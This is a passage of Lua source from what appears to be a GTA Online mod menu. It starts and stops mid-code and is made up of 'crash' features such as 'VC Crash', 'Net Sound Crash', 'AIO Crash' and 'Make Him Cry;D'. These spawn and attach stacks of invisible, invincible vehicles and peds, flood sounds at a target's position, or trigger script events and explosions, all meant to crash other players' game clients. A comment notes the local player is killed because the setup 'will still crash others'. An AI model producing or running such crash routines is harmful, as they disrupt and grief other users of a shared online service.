            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_brittlebush_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_brittlebush_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_brittlebush_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_desert_sage_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_desert_sage_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_desert_sage_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_drygrasses01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_drygrasses01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_drygrasses01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)  
            wait(3000)
            entities.delete(minitank)
            wait(100)
            entities.delete(patrolboat)
            wait(100)
            entities.delete(h4_prop_bush_buddleia_low_01)
            wait(100)
            entities.delete(h4_prop_bush_ear_aa)
            wait(100)
            entities.delete(h4_prop_bush_ear_ab)
            wait(100)
            entities.delete(h4_prop_bush_fern_low_01)
            wait(100)
            entities.delete(h4_prop_bush_mang_ad)
            wait(100)
            entities.delete(h4_prop_bush_mang_low_aa)
            wait(100)
            entities.delete(h4_prop_bush_mang_low_ab)
            wait(100)
            entities.delete(h4_prop_bush_seagrape_low_01)
            wait(100)
            entities.delete(h4_prop_grass_med_01)
            wait(100)
            entities.delete(h4_prop_grass_tropical_lush_01)
            wait(100)
            entities.delete(h4_prop_bush_fern_tall_cc)
            wait(100)
            entities.delete(h4_prop_grass_wiregrass_01)
            wait(100)
            entities.delete(h4_prop_weed_01_plant)
            wait(100)
            entities.delete(h4_prop_weed_01_row)
            wait(100)
            entities.delete(h4_prop_weed_groundcover_01)
            wait(100)
            entities.delete(barracks)
            wait(100)
            entities.delete(barracks3)
            wait(100)
            entities.delete(dune)
            wait(100)
            entities.delete(marquis)
            wait(100)
            entities.delete(marshall)
            wait(100)
            entities.delete(monster)
            wait(100)
            entities.delete(tug)
            wait(100)
            entities.delete(proc_brittlebush_01)
            wait(100)
            entities.delete(proc_desert_sage_01)
            wait(100)
            entities.delete(proc_drygrasses01)
            wait(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true)
            wait(1000)
            trigger_command("anticrashcamera off")
            toast("Ready")
        elseif s == 2 then
            if pid ~= players.user() then
                local math_random = math.random
                local joaat = joaat
                wait(100)
                local pedhash = joaat("slod_large_quadped")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds1[i])
                    wait(5)
                end
                local pedhash = joaat("slod_small_quadped")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds1[i])
                    wait(5)
                end
                local pedhash = joaat("slod_human")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    wait(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds20 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                    wait(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                    wait()
                end
                wait(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds20[i])
                    wait(5)					
                end
                wait(100)
                toast("Ready")
            else
                toast("You can't use it on yourself")
            end
        elseif s == 3 then
            local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = getOffsetFromEntityGivenDistance(targetPed, 20.0)
            pos.z = pos.z + 30.0
            local hash = joaat("banshee")
            STREAMING.REQUEST_MODEL(hash)
            local plane = entities.create_vehicle(hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            setEntityFaceEntity(plane, targetPed, true)
            ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(plane, true)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150)
            VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(plane, 1)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(plane, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(plane, " ")
            for i = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(plane, i) - 1
			    VEHICLE.SET_VEHICLE_MOD(plane, i, mod, true)
			    VEHICLE.TOGGLE_VEHICLE_MOD(plane, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(plane, j) then
                    VEHICLE.SET_VEHICLE_EXTRA(plane, j, true)
                end
            end
            toast("Ready")
        elseif s == 4 then
local user = players.user_ped()
        local model = util.joaat("tug")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function() 
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
local playername = PLAYER.GET_PLAYER_NAME(pid)
        trigger_command("wp" .. playername .. " on")
            trigger_command("wp" .. playername .. " off")
            wait(100)
            trigger_command("tpwp")
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            trigger_command("drpack on")
for q = 1, 50 do
 local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), p, 0, 0, 0, 0, 0, 0, 0, false, true, false, false, 0, true)
trigger_command("mpmale")
wait(25)
trigger_command("mpfemale")
wait(25)
end            
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(200)
            ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            trigger_command("outfitdefault")
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(200)          
 trigger_command("drpack off")
            ENTITY.SET_ENTITY_HEALTH(user, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
            toast("Ready")
end)
        end
    end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
	
	--VC CRASH
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	

	menu.click_slider(crashes,"VC Crash", {}, "Attaching to a hook what can't be attached(Veh gadget crash)", 1, 2, 1, 1, function(s)
        local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		if s == 1 then
            trigger_command("anticrashcamera on")
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
			local hash1 = joaat("dune")
			STREAMING.REQUEST_MODEL(hash1)
			while not STREAMING.HAS_MODEL_LOADED(hash1) do
		    wait()
			end
			local dune = entities.create_vehicle(hash1, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			ENTITY.SET_ENTITY_INVINCIBLE(dune, true)
            ENTITY.FREEZE_ENTITY_POSITION(dune, true)
			local hash2 = joaat("dune")
			STREAMING.REQUEST_MODEL(hash2)
			while not STREAMING.HAS_MODEL_LOADED(hash2) do
		    wait()
			end
			local dune1 = entities.create_vehicle(hash2, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(dune1, true)
            ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
			local hash3 = joaat("barracks")
			STREAMING.REQUEST_MODEL(hash3)
			while not STREAMING.HAS_MODEL_LOADED(hash3) do
		    wait()
			end
			local barracks = entities.create_vehicle(hash3, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
			local hash4 = joaat("barracks")
			STREAMING.REQUEST_MODEL(hash4)
			while not STREAMING.HAS_MODEL_LOADED(hash4) do
		    wait()
			end
			local barracks1 = entities.create_vehicle(hash4, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks1, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
			local hash5 = joaat("towtruck2")
			STREAMING.REQUEST_MODEL(hash5)
			while not STREAMING.HAS_MODEL_LOADED(hash5) do
		    wait()
			end
			local towtruck2 = entities.create_vehicle(hash5, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(towtruck2, true)
            ENTITY.FREEZE_ENTITY_POSITION(towtruck2, true)			 
			local hash6 = joaat("barracks3")
			STREAMING.REQUEST_MODEL(hash6)
			while not STREAMING.HAS_MODEL_LOADED(hash6) do
		    wait()
			end
			local barracks3 = entities.create_vehicle(hash6, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks3, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
			local hash7 = joaat("barracks3")
			STREAMING.REQUEST_MODEL(hash7)
			while not STREAMING.HAS_MODEL_LOADED(hash7) do
		    wait()
			end
			local barracks31 = entities.create_vehicle(hash7, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks31, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, towtruck2, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, towtruck2, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, towtruck2, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, towtruck2, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, towtruck2, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, towtruck2, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            for p = 1, 10 do
                pos = ENTITY.GET_ENTITY_COORDS(player_ped)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(towtruck2, pos.x, pos.y, pos.z, false, true, true)
            end
            wait(500)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true)
            wait(5000)
            entities.delete(towtruck2)
            wait(100)
            entities.delete(barracks3)
            wait(100)
            entities.delete(barracks31)
            wait(100)
            entities.delete(barracks)
            wait(100)
            entities.delete(barracks1)
            wait(100)
            entities.delete(dune)
            wait(100)
            entities.delete(dune1)
            trigger_command("anticrashcamera off")
            toast("Ready")
	    elseif s == 2 then
            trigger_command("anticrashcamera on")
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
			local hash1 = joaat("towtruck")
			STREAMING.REQUEST_MODEL(hash1)
			while not STREAMING.HAS_MODEL_LOADED(hash1) do
		    wait()
			end
			local towtruck = entities.create_vehicle(hash1, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			ENTITY.SET_ENTITY_INVINCIBLE(towtruck, true)
            ENTITY.FREEZE_ENTITY_POSITION(towtruck, true)
			local hash2 = joaat("towtruck2")
			STREAMING.REQUEST_MODEL(hash2)
			while not STREAMING.HAS_MODEL_LOADED(hash2) do
		    wait()
			end
			local towtruck2 = entities.create_vehicle(hash2, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			ENTITY.SET_ENTITY_INVINCIBLE(towtruck2, true)
            ENTITY.FREEZE_ENTITY_POSITION(towtruck2, true)
			local hash3 = joaat("scrap")
			STREAMING.REQUEST_MODEL(hash3)
			while not STREAMING.HAS_MODEL_LOADED(hash3) do
		    wait()
			end
			local scrap = entities.create_vehicle(hash3, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			ENTITY.SET_ENTITY_INVINCIBLE(scrap, true)
            ENTITY.FREEZE_ENTITY_POSITION(scrap, true)
			local hash4 = joaat("dinghy")
			STREAMING.REQUEST_MODEL(hash4)
			while not STREAMING.HAS_MODEL_LOADED(hash4) do
		    wait()
			end
			local dinghy = entities.create_vehicle(hash4, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			ENTITY.SET_ENTITY_INVINCIBLE(dinghy, true)
            ENTITY.FREEZE_ENTITY_POSITION(dinghy, true)
			local hash5 = joaat("dinghy3")
			STREAMING.REQUEST_MODEL(hash5)
			while not STREAMING.HAS_MODEL_LOADED(hash5) do
		    wait()
			end
			local dinghy3 = entities.create_vehicle(hash5, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(dinghy3, true)
            ENTITY.FREEZE_ENTITY_POSITION(dinghy3, true)	
			local hash6 = joaat("barracks")
			STREAMING.REQUEST_MODEL(hash6)
			while not STREAMING.HAS_MODEL_LOADED(hash6) do
		    wait()
			end
			local barracks = entities.create_vehicle(hash6, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks, true)	
			local hash7 = joaat("barracks3")
			STREAMING.REQUEST_MODEL(hash7)
			while not STREAMING.HAS_MODEL_LOADED(hash7) do
		    wait()
			end
			local barracks3 = entities.create_vehicle(hash7, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks3, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)	
            ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck2, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(scrap, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dinghy, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dinghy3, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck, myped, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
			for p = 1, 10 do
                pos = ENTITY.GET_ENTITY_COORDS(player_ped)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(towtruck, pos.x, pos.y, pos.z, false, true, true)
            end
            wait(500)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true)
            wait(5000)
            entities.delete(towtruck)
            wait(100)
            entities.delete(towtruck2)
            wait(100)
            entities.delete(scrap)
            wait(100)
            entities.delete(dinghy)
            wait(100)
            entities.delete(dinghy3)
            wait(100)
            entities.delete(barracks)
            wait(100)
            entities.delete(barracks3)
            trigger_command("anticrashcamera off")
            toast("Ready")
        end
    end)
	
	menu.click_slider(crashes,"Net Sound Crash", {}, "Targeted sound crash(Doesn't work on foreheads in interiors)", 1, 6, 1 , 1, function(s)
	    local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local time = util.current_time_millis() + 2500
        while time > util.current_time_millis() do
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            trigger_command("kstopall")
            for i = 1, 10 do
                if s == 1 then
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 1, false)
                elseif s == 2 then
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Checkpoint_Cash_Hit', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1, false)
                elseif s == 3 then
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Checkpoint_Teammate', pos.x, pos.y, pos.z, 'GTAO_Shepherd_Sounds', true, 1, false)
                elseif s == 4 then	
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '10s', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 1, false)
                elseif s == 5 then
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Checkpoint_Hit', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1, false)
                elseif s == 6 then
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1, false)
                end	
            end
            wait(0)
            toast("Ready")
        end
    end)
	
	menu.action(crashes,"AIO Crash (unstable)", {}, "Attach to the hook.", function()
        local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
        trigger_command("anticrashcamera on")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)

		local hash1 = joaat("towtruck")
		STREAMING.REQUEST_MODEL(hash1)
		while not STREAMING.HAS_MODEL_LOADED(hash1) do
		    wait()
		end
		local towtruck = entities.create_vehicle(hash1, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		ENTITY.SET_ENTITY_INVINCIBLE(towtruck, true)
        ENTITY.FREEZE_ENTITY_POSITION(towtruck, true)

		local hash2 = joaat("towtruck2")
		STREAMING.REQUEST_MODEL(hash2)
		while not STREAMING.HAS_MODEL_LOADED(hash2) do
		    wait()
		end
		local towtruck2 = entities.create_vehicle(hash2, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		ENTITY.SET_ENTITY_INVINCIBLE(towtruck2, true)
        ENTITY.FREEZE_ENTITY_POSITION(towtruck2, true)

		local hash3 = joaat("scrap")
		STREAMING.REQUEST_MODEL(hash3)
		while not STREAMING.HAS_MODEL_LOADED(hash3) do
		    wait()
		end
		local scrap = entities.create_vehicle(hash3, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		ENTITY.SET_ENTITY_INVINCIBLE(scrap, true)
        ENTITY.FREEZE_ENTITY_POSITION(scrap, true)

		local hash4 = joaat("dinghy")
		STREAMING.REQUEST_MODEL(hash4)
		while not STREAMING.HAS_MODEL_LOADED(hash4) do
		    wait()
		end
		local dinghy = entities.create_vehicle(hash4, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		ENTITY.SET_ENTITY_INVINCIBLE(dinghy, true)
        ENTITY.FREEZE_ENTITY_POSITION(dinghy, true)

		local hash5 = joaat("towtruck2")
		STREAMING.REQUEST_MODEL(hash5)
		while not STREAMING.HAS_MODEL_LOADED(hash5) do
		    wait()
		end
		local dinghy3 = entities.create_vehicle(hash5, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_INVINCIBLE(dinghy3, true)
        ENTITY.FREEZE_ENTITY_POSITION(dinghy3, true)

		local hash6 = joaat("barracks")
		STREAMING.REQUEST_MODEL(hash6)
		while not STREAMING.HAS_MODEL_LOADED(hash6) do
		    wait()
		end
		local barracks = entities.create_vehicle(hash6, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)
        ENTITY.FREEZE_ENTITY_POSITION(barracks, true)

		local hash7 = joaat("barracks3")
		STREAMING.REQUEST_MODEL(hash7)
		while not STREAMING.HAS_MODEL_LOADED(hash7) do
		    wait()
		end
		local barracks3 = entities.create_vehicle(hash7, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_INVINCIBLE(barracks3, true)
        ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)

        local hash8 = joaat("tr2")
		STREAMING.REQUEST_MODEL(hash8)
		while not STREAMING.HAS_MODEL_LOADED(hash8) do
		    wait()
		end
		local tr2 = entities.create_vehicle(hash8, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_INVINCIBLE(tr2, true)
        ENTITY.FREEZE_ENTITY_POSITION(tr2, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck2, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(scrap, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dinghy, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dinghy3, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck, myped, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(tr2, myped, 0, 0, 0, -10, 0, 0, 0, true, true, true, false, 0, true)
        wait(500)
        entities.delete(towtruck)
        wait(100)
        entities.delete(towtruck2)
        wait(100)
        entities.delete(scrap)
        wait(100)
        entities.delete(dinghy)
        wait(100)
        entities.delete(dinghy3)
        wait(100)
        entities.delete(barracks)
        wait(100)
        entities.delete(barracks3)
        wait(100)
        entities.delete(tr2)
        wait(500)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true)
        trigger_command("anticrashcamera off")
        toast("Ready")
    end)	
		  
	

----------------------------------------------
--Script Events Crash
----------------------------------------------



	menu.action(crashes, "Make Him Cry;D", {}, "Crash event script + orbital", function()
        if pid ~= players.user() then
            rg = math.random(461950868, 999999999)
            par1 = math.random(-100000, 99999999)
		    par2 = math.random(-4827432, 3231229)
		    par3 = math.random(46190868, 999999999)
		    par4 = math.random(-133223, 42746729)
		    par5 = math.random(-999999999, 428747628)
            par6 = math.random(-2147483647, 2147483647)
            par7 = math.random(-1986324736, 1747413822)
            par8 = math.random(-1986324736, 1777712108)
            par9 = math.random(-1673857408, 1780088064)
            par10 = math.random(-2588888790, 2100146067)
            local playername = PLAYER.GET_PLAYER_NAME(pid)
            trigger_command("brgm" .. playername .. " on")
            wait(1000)
            trigger_command("becomeorbitalcannon on") 
            wait(200)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED(players.user()), pos.x, pos.y, pos.z, 59, 999999.99, true, false, 8)
            wait(1000)
            trigger_command("becomeorbitalcannon off")
            wait(200)
